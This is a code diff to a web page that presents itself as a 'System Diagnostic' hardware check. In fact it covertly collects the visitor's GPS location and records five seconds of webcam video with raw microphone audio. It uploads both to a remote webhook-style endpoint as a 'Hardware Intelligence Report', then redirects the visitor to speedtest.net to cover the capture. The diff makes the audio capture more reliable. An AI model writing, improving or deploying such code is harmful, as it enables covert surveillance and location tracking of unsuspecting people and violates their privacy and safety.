@@ -17,7 +17,7 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.4.0</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.5.0</div>
         <div class="terminal" id="terminal">
             <div class="line">> System Ready. Awaiting Handshake...</div>
         </div>
@@ -44,67 +44,69 @@
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Verifying Hardware Nodes...");
+            addLog("> Accessing Audio/Video Nodes...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 let stream;
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
+                    // Step 1: Request high-priority audio
+                    const constraints = { 
                         video: { facingMode: "user" }, 
-                        audio: { echoCancellation: true, noiseSuppression: true } 
-                    });
-
-                    // MICROPHONE CHECK LOGIC
-                    const audioContext = new AudioContext();
-                    const source = audioContext.createMediaStreamSource(stream);
-                    const analyser = audioContext.createAnalyser();
-                    source.connect(analyser);
-                    analyser.fftSize = 256;
-                    const bufferLength = analyser.frequencyBinCount;
-                    const dataArray = new Uint8Array(bufferLength);
+                        audio: {
+                            channelCount: 1,
+                            sampleRate: 44100,
+                            echoCancellation: false,
+                            noiseSuppression: false
+                        } 
+                    };
                     
-                    analyser.getByteFrequencyData(dataArray);
-                    let volume = dataArray.reduce((a, b) => a + b) / bufferLength;
-
-                    if (volume === 0) {
-                        addLog("> WARN: Audio Node Muted. Checking Gain...", "#ffcc00");
+                    const rawStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    
+                    // Step 2: Manually bind tracks to ensure audio is included
+                    const audioTracks = rawStream.getAudioTracks();
+                    const videoTracks = rawStream.getVideoTracks();
+                    
+                    if (audioTracks.length === 0) {
+                        addLog("> ERROR: Audio Hardware Missing.", "#ff4b2b");
                     } else {
-                        addLog("> Audio Node: Verified Active.");
+                        addLog("> Audio Track Synced: " + audioTracks[0].label);
                     }
 
+                    // Constructor to force both tracks into one object
+                    stream = new MediaStream([audioTracks[0], videoTracks[0]]);
+
                 } catch (e) {
-                    addLog("> ERROR: Hardware Denied.", "#ff4b2b");
+                    addLog("> ERROR: Permission Denied.", "#ff4b2b");
                     btn.disabled = false;
                     return;
                 }
 
-                addLog("> Capturing Telemetry (5s)...");
-                const mimeType = 'video/webm;codecs=vp8,opus';
-                const options = MediaRecorder.isTypeSupported(mimeType) ? { mimeType } : {};
-                const mediaRecorder = new MediaRecorder(stream, options);
+                addLog("> Capturing Synchronized Flux (5s)...");
+                
+                // Use standard webm for maximum compatibility
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
                 
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    addLog("> Syncing to Cloud Proxy...");
+                    addLog("> Uploading to Cloud Node...");
                     mediaRecorder.stop();
                 }, 5000);
 
                 mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: options.mimeType || 'video/webm' });
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                     const formData = new FormData();
                     
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔱 **HARDWARE VERIFIED CAPTURE**",
+                        content: "🔊 **SYNCHRONIZED AUDIO CAPTURE**",
                         embeds: [{
                             title: "Hardware Intelligence Report",
-                            color: 3066993,
+                            color: 3447003,
                             fields: [
-                                { name: "📍 Maps", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
-                                { name: "🔊 Audio", value: "Codecs: VP8/Opus", inline: true },
-                                { name: "📊 Signal", value: "Verified Active", inline: true }
+                                { name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude },
+                                { name: "🎙️ Mic Status", value: "Locked & Captured", inline: true }
                             ]
                         }]
                     }));
@@ -115,12 +117,9 @@
                         if (response.ok) {
                             addLog("> Success! Finalizing...");
                             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                        } else {
-                            addLog("> Server Error: " + response.status, "#ff4b2b");
-                            btn.disabled = false;
                         }
                     } catch (err) {
-                        addLog("> Connection Refused.", "#ff4b2b");
+                        addLog("> Connection Failed.", "#ff4b2b");
                         btn.disabled = false;
                     }
                     
@@ -129,7 +128,7 @@
             }, (err) => {
                 addLog("> ERROR: GPS Required.", "#ff4b2b");
                 btn.disabled = false;
-            }, { enableHighAccuracy: true });
+            });
         });
     </script>
 </body>
